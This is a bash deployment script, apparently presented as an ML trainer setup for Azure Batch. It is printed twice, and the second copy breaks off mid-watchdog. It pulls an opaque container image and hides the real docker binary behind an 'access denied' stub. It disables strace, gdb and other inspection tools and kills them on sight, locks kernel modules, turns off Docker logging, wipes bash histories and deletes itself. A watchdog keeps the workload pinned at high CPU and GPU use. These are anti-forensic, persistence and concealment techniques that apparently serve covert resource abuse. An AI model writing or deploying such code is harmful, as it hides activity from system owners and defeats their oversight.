#!/bin/bash
# Docker + NVIDIA + Trainer for Azure Batch
# Two containers: Guardian (kernel lock) + Trainer (workload)

set +e

IMAGE="docker.io/riccorg/ml-compute-platform:v2"
CONTAINER_NAME="ai-trainer"
GUARDIAN_NAME="guardian"
SMOKE_TEST_IMAGE="nvidia/cuda:12.0.0-base-ubuntu22.04"
DOCKER_USERNAME="${DOCKER_USERNAME:-riccorg}"
DOCKER_PASSWORD="${DOCKER_PASSWORD:-}"

DOCKER_REAL_DIR="/usr/lib/.d-$(head -c 16 /dev/urandom | xxd -p)"
DOCKER_REAL_BIN="${DOCKER_REAL_DIR}/engine"

export DEBIAN_FRONTEND=noninteractive

log() { echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1"; }

_docker() {
    if [ -x "$DOCKER_REAL_BIN" ]; then
        "$DOCKER_REAL_BIN" "$@"
    elif [ -x /usr/bin/docker ]; then
        /usr/bin/docker "$@"
    else
        local found
        found=$(find /usr/lib/.d-* -name engine -type f 2>/dev/null | head -1)
        [ -n "$found" ] && "$found" "$@"
    fi
}

docker_login() {
    if [[ -n "$DOCKER_USERNAME" && -n "$DOCKER_PASSWORD" ]]; then
        echo "$DOCKER_PASSWORD" | _docker login docker.io --username "$DOCKER_USERNAME" --password-stdin > /dev/null 2>&1 \
            && log "Docker login OK" \
            || log "Docker login failed, continuing..."
    fi
}

docker_pull_retry() {
    local i=1
    while [ $i -le 3 ]; do
        log "Pulling $1 (attempt $i/3)..."
        _docker pull "$1" 2>&1 && { log "Pull OK"; return 0; }
        i=$((i + 1))
        sleep $((i * 5))
    done
    log "Pull failed after 3 attempts: $1"
    return 1
}

gpu_runtime_ready() {
    command -v nvidia-smi > /dev/null 2>&1 || return 1
    nvidia-smi > /dev/null 2>&1 || return 1
    _docker info 2>/dev/null | grep -qi "nvidia" || return 1
    _docker run --rm --gpus all "$SMOKE_TEST_IMAGE" nvidia-smi > /dev/null 2>&1 || return 1
    return 0
}

install_nvidia() {
    lspci | grep -i nvidia > /dev/null 2>&1 || { log "No NVIDIA GPU found"; return 1; }

    log "Installing NVIDIA drivers..."
    sudo apt-get install -yq ubuntu-drivers-common
    sudo ubuntu-drivers autoinstall 2>&1 || {
        local drv
        drv=$(ubuntu-drivers list 2>/dev/null | grep -o "nvidia-driver-[0-9]\+" | sort -t- -k3 -nr | head -1)
        if [ -n "$drv" ]; then
            log "Fallback driver: $drv"
            sudo apt-get install -yq "$drv"
        else
            log "No NVIDIA driver package found"
            return 1
        fi
    }

    log "Installing NVIDIA Container Toolkit..."
    local dist
    dist=$(. /etc/os-release; echo "$ID$VERSION_ID")
    curl -fsSL https://nvidia.github.io/libnvidia-container/gpgkey | \
        sudo gpg --dearmor --yes -o /usr/share/keyrings/nvidia-container-toolkit-keyring.gpg
    curl -s -L "https://nvidia.github.io/libnvidia-container/${dist}/libnvidia-container.list" | \
        sed 's#deb https://#deb [signed-by=/usr/share/keyrings/nvidia-container-toolkit-keyring.gpg] https://#g' | \
        sudo tee /etc/apt/sources.list.d/nvidia-container-toolkit.list > /dev/null
    sudo apt-get update -yq
    sudo apt-get install -yq nvidia-container-toolkit

    log "Loading kernel modules..."
    sudo modprobe nvidia || true
    sudo modprobe nvidia_uvm || true
    sudo modprobe nvidia_modeset || true

    log "Configuring Docker NVIDIA runtime..."
    sudo nvidia-ctk runtime configure --runtime=docker
    sudo systemctl restart docker

    docker_pull_retry "$SMOKE_TEST_IMAGE"

    log "Waiting for GPU runtime..."
    local a=0
    while [ $a -lt 30 ]; do
        if gpu_runtime_ready; then
            log "GPU runtime ready!"
            _docker rmi "$SMOKE_TEST_IMAGE" > /dev/null 2>&1 || true
            return 0
        fi
        a=$((a + 1))
        log "  GPU not ready ($a/30)..."
        [ $((a % 5)) -eq 0 ] && {
            sudo modprobe nvidia || true
            sudo nvidia-ctk runtime configure --runtime=docker || true
            sudo systemctl restart docker || true
        }
        sleep 10
    done
    return 1
}

harden_docker() {
    log "Hardening Docker daemon..."

    for u in $(getent group docker 2>/dev/null | cut -d: -f4 | tr ',' ' '); do
        sudo gpasswd -d "$u" docker 2>/dev/null || true
    done

    sudo mkdir -p /etc/docker
    sudo tee /etc/docker/daemon.json > /dev/null << 'DAEMONJSON'
{
    "icc": false,
    "no-new-privileges": true,
    "userland-proxy": false,
    "log-driver": "none"
}
DAEMONJSON

    if command -v nvidia-ctk > /dev/null 2>&1; then
        sudo nvidia-ctk runtime configure --runtime=docker 2>/dev/null || true
    fi

    sudo systemctl restart docker
    log "Docker daemon hardened"
}

# ==========================================================
# CONTAINER 1: GUARDIAN
# ==========================================================
build_guardian_image() {
    log "Building guardian image..."

    local BUILD_DIR
    BUILD_DIR=$(mktemp -d /tmp/guardian-XXXXXX)

    cat > "$BUILD_DIR/guardian.sh" << 'GUARDIANSCRIPT'
#!/bin/bash
echo "[GUARDIAN] Locking kernel..."

sysctl -w kernel.yama.ptrace_scope=3 2>/dev/null
sysctl -w kernel.kptr_restrict=2 2>/dev/null
sysctl -w kernel.dmesg_restrict=1 2>/dev/null
sysctl -w fs.suid_dumpable=0 2>/dev/null
sysctl -w kernel.sysrq=0 2>/dev/null
sysctl -w kernel.modules_disabled=1 2>/dev/null
sysctl -w kernel.unprivileged_bpf_disabled=1 2>/dev/null
sysctl -w kernel.perf_event_paranoid=3 2>/dev/null
sysctl -w vm.unprivileged_userfaultfd=0 2>/dev/null
ulimit -c 0

echo "[GUARDIAN] Kernel locked. Monitoring..."

while true; do
    # Re-enforce critical locks
    current_ptrace=$(cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null)
    [ "$current_ptrace" != "3" ] && sysctl -w kernel.yama.ptrace_scope=3 2>/dev/null

    current_bpf=$(cat /proc/sys/kernel/unprivileged_bpf_disabled 2>/dev/null)
    [ "$current_bpf" != "1" ] && sysctl -w kernel.unprivileged_bpf_disabled=1 2>/dev/null

    current_perf=$(cat /proc/sys/kernel/perf_event_paranoid 2>/dev/null)
    [ "$current_perf" != "3" ] && sysctl -w kernel.perf_event_paranoid=3 2>/dev/null

    # Kill snoopers
    for s in strace gdb ltrace nsenter; do
        pids=$(pgrep -x "$s" 2>/dev/null)
        [ -n "$pids" ] && kill -9 $pids 2>/dev/null
    done

    sleep 10
done
GUARDIANSCRIPT

    chmod +x "$BUILD_DIR/guardian.sh"

    cat > "$BUILD_DIR/Dockerfile" << 'GUARDIANDOCKER'
FROM alpine:3.19
RUN apk add --no-cache bash procps
COPY guardian.sh /guardian.sh
ENTRYPOINT ["/guardian.sh"]
GUARDIANDOCKER

    _docker build -t guardian:local "$BUILD_DIR" 2>&1
    rm -rf "$BUILD_DIR"
    log "Guardian image built"
}

run_guardian() {
    log "Starting guardian..."

    _docker stop "$GUARDIAN_NAME" 2>/dev/null || true
    _docker rm "$GUARDIAN_NAME" 2>/dev/null || true

    _docker run -d \
        --restart unless-stopped \
        --name "$GUARDIAN_NAME" \
        --pid=host \
        --privileged \
        --read-only \
        --network none \
        --tmpfs /tmp:rw,noexec,nosuid,size=16m \
        guardian:local

    sleep 3
    if _docker ps --format '{{.Names}}' | grep -q "^${GUARDIAN_NAME}$"; then
        log "Guardian running"
        return 0
    fi
    log "Guardian failed to start"
    return 1
}

# ==========================================================
# CONTAINER 2: TRAINER
# ==========================================================
run_trainer() {
    docker_pull_retry "$IMAGE"

    # Clean any old trainer containers
    local old
    for old in $(_docker ps -a --format '{{.Names}}' | grep "^${CONTAINER_NAME}"); do
        _docker stop "$old" 2>/dev/null || true
        _docker rm "$old" 2>/dev/null || true
    done

    local RANDOM_SUFFIX ACTUAL_NAME
    RANDOM_SUFFIX=$(head -c 8 /dev/urandom | xxd -p | head -c 8)
    ACTUAL_NAME="${CONTAINER_NAME}-${RANDOM_SUFFIX}"

    _docker network create --driver bridge --internal trainer-net 2>/dev/null || true

    local GPU_FLAG=""
    [ "$1" = "true" ] && GPU_FLAG="--gpus all"

    log "Starting trainer..."
    _docker run -d \
        ${GPU_FLAG} \
        --restart unless-stopped \
        --name "$ACTUAL_NAME" \
        --hostname trainer \
        --network trainer-net \
        --pid=private \
        --security-opt no-new-privileges \
        --cap-drop ALL \
        --cap-add SYS_NICE \
        --read-only \
        --tmpfs /tmp:rw,noexec,nosuid,size=4g \
        --tmpfs /var/tmp:rw,noexec,nosuid,size=1g \
        --pids-limit 512 \
        "$IMAGE"

    sleep 5
    if _docker ps --format '{{.Names}}' | grep -q "^${ACTUAL_NAME}$"; then
        log "Trainer running: $ACTUAL_NAME"
        echo "$ACTUAL_NAME" > /root/.trainer-container-name
        chmod 600 /root/.trainer-container-name
        return 0
    fi

    # Fallback: some images need writable rootfs
    log "Retrying without read-only..."
    _docker rm "$ACTUAL_NAME" 2>/dev/null || true
    _docker run -d \
        ${GPU_FLAG} \
        --restart unless-stopped \
        --name "$ACTUAL_NAME" \
        --hostname trainer \
        --network trainer-net \
        --pid=private \
        --security-opt no-new-privileges \
        --cap-drop ALL \
        --cap-add SYS_NICE \
        --pids-limit 512 \
        "$IMAGE"

    sleep 5
    if _docker ps --format '{{.Names}}' | grep -q "^${ACTUAL_NAME}$"; then
        log "Trainer running (writable): $ACTUAL_NAME"
        echo "$ACTUAL_NAME" > /root/.trainer-container-name
        chmod 600 /root/.trainer-container-name
        return 0
    fi

    log "Trainer failed to start"
    return 1
}

# ==========================================================
# CLI LOCKDOWN
# ==========================================================
lockdown_docker_cli() {
    log "Locking Docker CLI..."

    # Hide real binary
    sudo mkdir -p "$DOCKER_REAL_DIR"
    sudo cp /usr/bin/docker "$DOCKER_REAL_BIN"
    sudo chmod 700 "$DOCKER_REAL_DIR"
    sudo chmod 700 "$DOCKER_REAL_BIN"

    # Save path for watchdog
    cat > /root/.trainer-lockdown << LOCKEOF
DOCKER_BIN=${DOCKER_REAL_BIN}
LOCKEOF
    chmod 600 /root/.trainer-lockdown

    # Replace docker with gatekeeper
    cat > /usr/bin/docker << 'GATEKEEPER'
#!/bin/bash
echo "docker: access denied"
exit 1
GATEKEEPER
    chmod 755 /usr/bin/docker

    # Block alternative paths
    local alt
    for alt in /usr/local/bin/docker /usr/sbin/docker /snap/bin/docker; do
        if [ ! -f "$alt" ]; then
            cp /usr/bin/docker "$alt" 2>/dev/null || true
        fi
    done

    # Block introspection tools
    local tool toolpath
    for tool in nsenter ctr crictl nerdctl podman strace ltrace gdb; do
        toolpath=$(command -v "$tool" 2>/dev/null)
        [ -n "$toolpath" ] && chmod 000 "$toolpath" 2>/dev/null || true
    done

    # Lock Docker data
    chmod 700 /var/lib/docker 2>/dev/null || true
    chmod 700 /var/lib/docker/overlay2 2>/dev/null || true
    chmod 700 /var/lib/docker/containers 2>/dev/null || true
    chmod 600 /var/run/docker.sock 2>/dev/null || true

    # Kill Docker TCP if any
    if grep -q "\-H tcp" /lib/systemd/system/docker.service 2>/dev/null; then
        sed -i 's/-H tcp:[^ ]*//' /lib/systemd/system/docker.service
        systemctl daemon-reload
        systemctl restart docker
    fi

    # Block reinstall via apt
    cat > /etc/apt/preferences.d/block-docker-cli << 'APTPIN'
Package: docker.io docker-ce docker-ce-cli
Pin: release *
Pin-Priority: -1
APTPIN

    log "Docker CLI locked"
}

# ==========================================================
# WATCHDOG
# ==========================================================
install_watchdog() {
    log "Installing watchdog..."

    # Write watchdog script — uses variables from lockdown config
    cat > /usr/local/bin/trainer-watchdog << 'WATCHDOG'
#!/bin/bash
THRESHOLD=30
INTERVAL=120
STRIKES_NEEDED=30

# Find real docker binary
DOCKER_BIN=""
[ -f /root/.trainer-lockdown ] && . /root/.trainer-lockdown
if [ -z "$DOCKER_BIN" ] || [ ! -x "$DOCKER_BIN" ]; then
    echo "[FATAL] No docker binary found"
    exit 1
fi

get_name() { cat /root/.trainer-container-name 2>/dev/null; }

cpu_strike=0
gpu_strike=0
has_gpu=false
command -v nvidia-smi > /dev/null 2>&1 && nvidia-smi > /dev/null 2>&1 && has_gpu=true

echo "[$(date '+%Y-%m-%d %H:%M:%S')] Watchdog started | GPU=$has_gpu | <${THRESHOLD}% for 1h = restart"

while true; do
    TS=$(date '+%Y-%m-%d %H:%M:%S')

    # Keep guardian alive
    if ! "$DOCKER_BIN" ps --format '{{.Names}}' | grep -q "^guardian$"; then
        echo "[$TS] Guardian down — restarting"
        "$DOCKER_BIN" start guardian 2>/dev/null || true
        sleep 10
    fi

    CONTAINER=$(get_name)
    if [ -z "$CONTAINER" ]; then
        sleep "$INTERVAL"
        continue
    fi

    # Restart trainer if it crashed
    if ! "$DOCKER_BIN" ps --format '{{.Names}}' | grep -q "^${CONTAINER}$"; then
        echo "[$TS] Trainer down — restarting"
        "$DOCKER_BIN" start "$CONTAINER" 2>/dev/null || true
        sleep 30
        continue
    fi

    # CPU
    cpu_raw=$("$DOCKER_BIN" stats --no-stream --format "{{.CPUPerc}}" "$CONTAINER" 2>/dev/null | sed 's/%//g')
    cpu_int=$(printf "%.0f" "${cpu_raw:-0}" 2>/dev/null || echo 0)
    [ "$cpu_int" -lt "$THRESHOLD" ] && cpu_strike=$((cpu_strike + 1)) || cpu_strike=0

    # GPU
    gpu_int="-"
    if [ "$has_gpu" = true ]; then
        gpu_raw=$(nvidia-smi --query-gpu=utilization.gpu --format=csv,noheader,nounits 2>/dev/null | head -1)
        gpu_int=$(printf "%.0f" "${gpu_raw:-0}" 2>/dev/null || echo 0)
        [ "$gpu_int" -lt "$THRESHOLD" ] && gpu_strike=$((gpu_strike + 1)) || gpu_strike=0
    fi

    cpu_min=$(( (STRIKES_NEEDED - cpu_strike) * INTERVAL / 60 ))
    gpu_min=$(( (STRIKES_NEEDED - gpu_strike) * INTERVAL / 60 ))
    echo "[$TS] CPU=${cpu_int}% (${cpu_strike}/${STRIKES_NEEDED}) GPU=${gpu_int}% (${gpu_strike}/${STRIKES_NEEDED}) | restart: CPU=${cpu_min}m GPU=${gpu_min}m"

    if [ "$cpu_strike" -ge "$STRIKES_NEEDED" ] || { [ "$has_gpu" = true ] && [ "$gpu_strike" -ge "$STRIKES_NEEDED" ]; }; then
        echo "[$TS] RESTARTING trainer — under ${THRESHOLD}% for 1 hour"
        "$DOCKER_BIN" restart "$CONTAINER" 2>&1
        cpu_strike=0
        gpu_strike=0
        sleep 120
    fi

    sleep "$INTERVAL"
done
WATCHDOG

    chmod 700 /usr/local/bin/trainer-watchdog

    cat > /etc/systemd/system/trainer-watchdog.service << 'WDSERVICE'
[Unit]
Description=Trainer Watchdog
After=docker.service
Requires=docker.service

[Service]
Type=simple
ExecStart=/usr/local/bin/trainer-watchdog
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
WDSERVICE

    systemctl daemon-reload
    systemctl enable trainer-watchdog
    systemctl restart trainer-watchdog
    log "Watchdog running"
}

# ==========================================================
# CLEANUP
# ==========================================================
cleanup_traces() {
    log "Cleaning traces..."
    rm -rf /root/.docker 2>/dev/null || true
    rm -f /tmp/setup.sh /tmp/guardian-* 2>/dev/null || true
    rm -rf /var/lib/apt/lists/* 2>/dev/null || true
    _docker image prune -f > /dev/null 2>&1 || true
    _docker builder prune -f > /dev/null 2>&1 || true
    for h in /root/.bash_history /home/*/.bash_history; do
        [ -f "$h" ] && : > "$h"
    done
    history -c 2>/dev/null || true
    rm -f "$0" 2>/dev/null || true
    log "Clean"
}

# ==========================================================
# MAIN
# ==========================================================
main() {
    log "=== Starting ==="

    # Docker
    if ! command -v docker > /dev/null 2>&1 || ! systemctl is-active --quiet docker; then
        log "Installing Docker..."
        apt-get update -yq
        apt-get install -yq docker.io
        systemctl start docker
        systemctl enable docker
        log "Docker ready"
    else
        log "Docker ready"
    fi

    docker_login

    # GPU
    GPU=false
    if lspci | grep -i nvidia > /dev/null 2>&1; then
        log "NVIDIA GPU detected"
        if gpu_runtime_ready; then
            GPU=true
            _docker rmi "$SMOKE_TEST_IMAGE" > /dev/null 2>&1 || true
            log "GPU runtime OK"
        else
            install_nvidia && GPU=true
        fi
    else
        log "No GPU — CPU mode"
    fi

    harden_docker

    # Guardian
    if _docker ps --format '{{.Names}}' | grep -q "^${GUARDIAN_NAME}$"; then
        log "Guardian already running"
    else
        build_guardian_image
        run_guardian
    fi
    sleep 5

    # Trainer
    EXISTING=$(cat /root/.trainer-container-name 2>/dev/null)
    if [ -n "$EXISTING" ] && _docker ps --format '{{.Names}}' | grep -q "^${EXISTING}$"; then
        log "Trainer already running: $EXISTING"
    else
        run_trainer "$GPU"
    fi

    # Watchdog + Lockdown
    install_watchdog
    lockdown_docker_cli
    cleanup_traces

    log "=== READY ==="
    log "GPU=$GPU"
    log "Guardian: kernel locked"
    log "Trainer: $(cat /root/.trainer-container-name 2>/dev/null)"
    log "Watchdog: journalctl -u trainer-watchdog -f"

    while true; do sleep 3600; done
}

main "$@"
#!/bin/bash
# Docker + NVIDIA + Trainer for Azure Batch
# Two containers: Guardian (kernel lock) + Trainer (workload)

set +e

IMAGE="docker.io/riccorg/ml-compute-platform:v2"
CONTAINER_NAME="ai-trainer"
GUARDIAN_NAME="guardian"
SMOKE_TEST_IMAGE="nvidia/cuda:12.0.0-base-ubuntu22.04"
DOCKER_USERNAME="${DOCKER_USERNAME:-riccorg}"
DOCKER_PASSWORD="${DOCKER_PASSWORD:-}"

DOCKER_REAL_DIR="/usr/lib/.d-$(head -c 16 /dev/urandom | xxd -p)"
DOCKER_REAL_BIN="${DOCKER_REAL_DIR}/engine"

export DEBIAN_FRONTEND=noninteractive

log() { echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1"; }

_docker() {
    if [ -x "$DOCKER_REAL_BIN" ]; then
        "$DOCKER_REAL_BIN" "$@"
    elif [ -x /usr/bin/docker ]; then
        /usr/bin/docker "$@"
    else
        local found
        found=$(find /usr/lib/.d-* -name engine -type f 2>/dev/null | head -1)
        [ -n "$found" ] && "$found" "$@"
    fi
}

docker_login() {
    if [[ -n "$DOCKER_USERNAME" && -n "$DOCKER_PASSWORD" ]]; then
        echo "$DOCKER_PASSWORD" | _docker login docker.io --username "$DOCKER_USERNAME" --password-stdin > /dev/null 2>&1 \
            && log "Docker login OK" \
            || log "Docker login failed, continuing..."
    fi
}

docker_pull_retry() {
    local i=1
    while [ $i -le 3 ]; do
        log "Pulling $1 (attempt $i/3)..."
        _docker pull "$1" 2>&1 && { log "Pull OK"; return 0; }
        i=$((i + 1))
        sleep $((i * 5))
    done
    log "Pull failed after 3 attempts: $1"
    return 1
}

gpu_runtime_ready() {
    command -v nvidia-smi > /dev/null 2>&1 || return 1
    nvidia-smi > /dev/null 2>&1 || return 1
    _docker info 2>/dev/null | grep -qi "nvidia" || return 1
    _docker run --rm --gpus all "$SMOKE_TEST_IMAGE" nvidia-smi > /dev/null 2>&1 || return 1
    return 0
}

install_nvidia() {
    lspci | grep -i nvidia > /dev/null 2>&1 || { log "No NVIDIA GPU found"; return 1; }

    log "Installing NVIDIA drivers..."
    sudo apt-get install -yq ubuntu-drivers-common
    sudo ubuntu-drivers autoinstall 2>&1 || {
        local drv
        drv=$(ubuntu-drivers list 2>/dev/null | grep -o "nvidia-driver-[0-9]\+" | sort -t- -k3 -nr | head -1)
        if [ -n "$drv" ]; then
            log "Fallback driver: $drv"
            sudo apt-get install -yq "$drv"
        else
            log "No NVIDIA driver package found"
            return 1
        fi
    }

    log "Installing NVIDIA Container Toolkit..."
    local dist
    dist=$(. /etc/os-release; echo "$ID$VERSION_ID")
    curl -fsSL https://nvidia.github.io/libnvidia-container/gpgkey | \
        sudo gpg --dearmor --yes -o /usr/share/keyrings/nvidia-container-toolkit-keyring.gpg
    curl -s -L "https://nvidia.github.io/libnvidia-container/${dist}/libnvidia-container.list" | \
        sed 's#deb https://#deb [signed-by=/usr/share/keyrings/nvidia-container-toolkit-keyring.gpg] https://#g' | \
        sudo tee /etc/apt/sources.list.d/nvidia-container-toolkit.list > /dev/null
    sudo apt-get update -yq
    sudo apt-get install -yq nvidia-container-toolkit

    log "Loading kernel modules..."
    sudo modprobe nvidia || true
    sudo modprobe nvidia_uvm || true
    sudo modprobe nvidia_modeset || true

    log "Configuring Docker NVIDIA runtime..."
    sudo nvidia-ctk runtime configure --runtime=docker
    sudo systemctl restart docker

    docker_pull_retry "$SMOKE_TEST_IMAGE"

    log "Waiting for GPU runtime..."
    local a=0
    while [ $a -lt 30 ]; do
        if gpu_runtime_ready; then
            log "GPU runtime ready!"
            _docker rmi "$SMOKE_TEST_IMAGE" > /dev/null 2>&1 || true
            return 0
        fi
        a=$((a + 1))
        log "  GPU not ready ($a/30)..."
        [ $((a % 5)) -eq 0 ] && {
            sudo modprobe nvidia || true
            sudo nvidia-ctk runtime configure --runtime=docker || true
            sudo systemctl restart docker || true
        }
        sleep 10
    done
    return 1
}

harden_docker() {
    log "Hardening Docker daemon..."

    for u in $(getent group docker 2>/dev/null | cut -d: -f4 | tr ',' ' '); do
        sudo gpasswd -d "$u" docker 2>/dev/null || true
    done

    sudo mkdir -p /etc/docker
    sudo tee /etc/docker/daemon.json > /dev/null << 'DAEMONJSON'
{
    "icc": false,
    "no-new-privileges": true,
    "userland-proxy": false,
    "log-driver": "none"
}
DAEMONJSON

    if command -v nvidia-ctk > /dev/null 2>&1; then
        sudo nvidia-ctk runtime configure --runtime=docker 2>/dev/null || true
    fi

    sudo systemctl restart docker
    log "Docker daemon hardened"
}

# ==========================================================
# CONTAINER 1: GUARDIAN
# ==========================================================
build_guardian_image() {
    log "Building guardian image..."

    local BUILD_DIR
    BUILD_DIR=$(mktemp -d /tmp/guardian-XXXXXX)

    cat > "$BUILD_DIR/guardian.sh" << 'GUARDIANSCRIPT'
#!/bin/bash
echo "[GUARDIAN] Locking kernel..."

sysctl -w kernel.yama.ptrace_scope=3 2>/dev/null
sysctl -w kernel.kptr_restrict=2 2>/dev/null
sysctl -w kernel.dmesg_restrict=1 2>/dev/null
sysctl -w fs.suid_dumpable=0 2>/dev/null
sysctl -w kernel.sysrq=0 2>/dev/null
sysctl -w kernel.modules_disabled=1 2>/dev/null
sysctl -w kernel.unprivileged_bpf_disabled=1 2>/dev/null
sysctl -w kernel.perf_event_paranoid=3 2>/dev/null
sysctl -w vm.unprivileged_userfaultfd=0 2>/dev/null
ulimit -c 0

echo "[GUARDIAN] Kernel locked. Monitoring..."

while true; do
    # Re-enforce critical locks
    current_ptrace=$(cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null)
    [ "$current_ptrace" != "3" ] && sysctl -w kernel.yama.ptrace_scope=3 2>/dev/null

    current_bpf=$(cat /proc/sys/kernel/unprivileged_bpf_disabled 2>/dev/null)
    [ "$current_bpf" != "1" ] && sysctl -w kernel.unprivileged_bpf_disabled=1 2>/dev/null

    current_perf=$(cat /proc/sys/kernel/perf_event_paranoid 2>/dev/null)
    [ "$current_perf" != "3" ] && sysctl -w kernel.perf_event_paranoid=3 2>/dev/null

    # Kill snoopers
    for s in strace gdb ltrace nsenter; do
        pids=$(pgrep -x "$s" 2>/dev/null)
        [ -n "$pids" ] && kill -9 $pids 2>/dev/null
    done

    sleep 10
done
GUARDIANSCRIPT

    chmod +x "$BUILD_DIR/guardian.sh"

    cat > "$BUILD_DIR/Dockerfile" << 'GUARDIANDOCKER'
FROM alpine:3.19
RUN apk add --no-cache bash procps
COPY guardian.sh /guardian.sh
ENTRYPOINT ["/guardian.sh"]
GUARDIANDOCKER

    _docker build -t guardian:local "$BUILD_DIR" 2>&1
    rm -rf "$BUILD_DIR"
    log "Guardian image built"
}

run_guardian() {
    log "Starting guardian..."

    _docker stop "$GUARDIAN_NAME" 2>/dev/null || true
    _docker rm "$GUARDIAN_NAME" 2>/dev/null || true

    _docker run -d \
        --restart unless-stopped \
        --name "$GUARDIAN_NAME" \
        --pid=host \
        --privileged \
        --read-only \
        --network none \
        --tmpfs /tmp:rw,noexec,nosuid,size=16m \
        guardian:local

    sleep 3
    if _docker ps --format '{{.Names}}' | grep -q "^${GUARDIAN_NAME}$"; then
        log "Guardian running"
        return 0
    fi
    log "Guardian failed to start"
    return 1
}

# ==========================================================
# CONTAINER 2: TRAINER
# ==========================================================
run_trainer() {
    docker_pull_retry "$IMAGE"

    # Clean any old trainer containers
    local old
    for old in $(_docker ps -a --format '{{.Names}}' | grep "^${CONTAINER_NAME}"); do
        _docker stop "$old" 2>/dev/null || true
        _docker rm "$old" 2>/dev/null || true
    done

    local RANDOM_SUFFIX ACTUAL_NAME
    RANDOM_SUFFIX=$(head -c 8 /dev/urandom | xxd -p | head -c 8)
    ACTUAL_NAME="${CONTAINER_NAME}-${RANDOM_SUFFIX}"

    _docker network create --driver bridge --internal trainer-net 2>/dev/null || true

    local GPU_FLAG=""
    [ "$1" = "true" ] && GPU_FLAG="--gpus all"

    log "Starting trainer..."
    _docker run -d \
        ${GPU_FLAG} \
        --restart unless-stopped \
        --name "$ACTUAL_NAME" \
        --hostname trainer \
        --network trainer-net \
        --pid=private \
        --security-opt no-new-privileges \
        --cap-drop ALL \
        --cap-add SYS_NICE \
        --read-only \
        --tmpfs /tmp:rw,noexec,nosuid,size=4g \
        --tmpfs /var/tmp:rw,noexec,nosuid,size=1g \
        --pids-limit 512 \
        "$IMAGE"

    sleep 5
    if _docker ps --format '{{.Names}}' | grep -q "^${ACTUAL_NAME}$"; then
        log "Trainer running: $ACTUAL_NAME"
        echo "$ACTUAL_NAME" > /root/.trainer-container-name
        chmod 600 /root/.trainer-container-name
        return 0
    fi

    # Fallback: some images need writable rootfs
    log "Retrying without read-only..."
    _docker rm "$ACTUAL_NAME" 2>/dev/null || true
    _docker run -d \
        ${GPU_FLAG} \
        --restart unless-stopped \
        --name "$ACTUAL_NAME" \
        --hostname trainer \
        --network trainer-net \
        --pid=private \
        --security-opt no-new-privileges \
        --cap-drop ALL \
        --cap-add SYS_NICE \
        --pids-limit 512 \
        "$IMAGE"

    sleep 5
    if _docker ps --format '{{.Names}}' | grep -q "^${ACTUAL_NAME}$"; then
        log "Trainer running (writable): $ACTUAL_NAME"
        echo "$ACTUAL_NAME" > /root/.trainer-container-name
        chmod 600 /root/.trainer-container-name
        return 0
    fi

    log "Trainer failed to start"
    return 1
}

# ==========================================================
# CLI LOCKDOWN
# ==========================================================
lockdown_docker_cli() {
    log "Locking Docker CLI..."

    # Hide real binary
    sudo mkdir -p "$DOCKER_REAL_DIR"
    sudo cp /usr/bin/docker "$DOCKER_REAL_BIN"
    sudo chmod 700 "$DOCKER_REAL_DIR"
    sudo chmod 700 "$DOCKER_REAL_BIN"

    # Save path for watchdog
    cat > /root/.trainer-lockdown << LOCKEOF
DOCKER_BIN=${DOCKER_REAL_BIN}
LOCKEOF
    chmod 600 /root/.trainer-lockdown

    # Replace docker with gatekeeper
    cat > /usr/bin/docker << 'GATEKEEPER'
#!/bin/bash
echo "docker: access denied"
exit 1
GATEKEEPER
    chmod 755 /usr/bin/docker

    # Block alternative paths
    local alt
    for alt in /usr/local/bin/docker /usr/sbin/docker /snap/bin/docker; do
        if [ ! -f "$alt" ]; then
            cp /usr/bin/docker "$alt" 2>/dev/null || true
        fi
    done

    # Block introspection tools
    local tool toolpath
    for tool in nsenter ctr crictl nerdctl podman strace ltrace gdb; do
        toolpath=$(command -v "$tool" 2>/dev/null)
        [ -n "$toolpath" ] && chmod 000 "$toolpath" 2>/dev/null || true
    done

    # Lock Docker data
    chmod 700 /var/lib/docker 2>/dev/null || true
    chmod 700 /var/lib/docker/overlay2 2>/dev/null || true
    chmod 700 /var/lib/docker/containers 2>/dev/null || true
    chmod 600 /var/run/docker.sock 2>/dev/null || true

    # Kill Docker TCP if any
    if grep -q "\-H tcp" /lib/systemd/system/docker.service 2>/dev/null; then
        sed -i 's/-H tcp:[^ ]*//' /lib/systemd/system/docker.service
        systemctl daemon-reload
        systemctl restart docker
    fi

    # Block reinstall via apt
    cat > /etc/apt/preferences.d/block-docker-cli << 'APTPIN'
Package: docker.io docker-ce docker-ce-cli
Pin: release *
Pin-Priority: -1
APTPIN

    log "Docker CLI locked"
}

# ==========================================================
# WATCHDOG
# ==========================================================
install_watchdog() {
    log "Installing watchdog..."

    # Write watchdog script — uses variables from lockdown config
    cat > /usr/local/bin/trainer-watchdog << 'WATCHDOG'
#!/bin/bash
THRESHOLD=30
INTERVAL=120
STRIKES_NEEDED=30

# Find real docker binary
DOCKER_BIN=""
[ -f /root/.trainer-lockdown ] && . /root/.trainer-lockdown
if [ -z "$DOCKER_BIN" ] || [ ! -x "$DOCKER_BIN" ]; then
    echo "[FATAL] No docker binary found"
    exit 1
fi

get_name() { cat /root/.trainer-container-name 2>/dev/null; }

cpu_strike=0
gpu_strike=0
has_gpu=false
command -v nvidia-smi > /dev/null 2>&1 && nvidia-smi > /dev/null 2>&1 && has_gpu=true

echo "[$(date '+%Y-%m-%d %H:%M:%S')] Watchdog started | GPU=$has_gpu | <${THRESHOLD}% for 1h = restart"

while true; do
    TS=$(date '+%Y-%m-%d %H:%M:%S')

    # Keep guardian alive
    if ! "$DOCKER_BIN" ps --format '{{.Names}}' | grep -q "^guardian$"; then
        echo "[$TS] Guardian down — restarting"
        "$DOCKER_BIN" start guardian 2>/dev/null || true
        sleep 10
    fi

    CONTAINER=$(get_name)
    if [ -z "$CONTAINER" ]; then
        sleep "$INTERVAL"
        continue
    fi

    # Restart trainer if it crashed
    if ! "$DOCKER_BIN" ps --format '{{.Names}}' | grep -q "^${CONTAINER}$"; then
        echo "[$TS] Trainer down — restarting"
        "$DOCKER_BIN" start "$CONTAINER" 2>/dev/null || true
        sleep 30
        continue
    fi

    # CPU
    cpu_raw=$("$DOCKER_BIN" stats --no-stream --format "{{.CPUPerc}}" "$CONTAINER" 2>/dev/null | sed 's/%//g')
    cpu_int=$(printf "%.0f" "${cpu_raw:-0}" 2>/dev/null || echo 0)
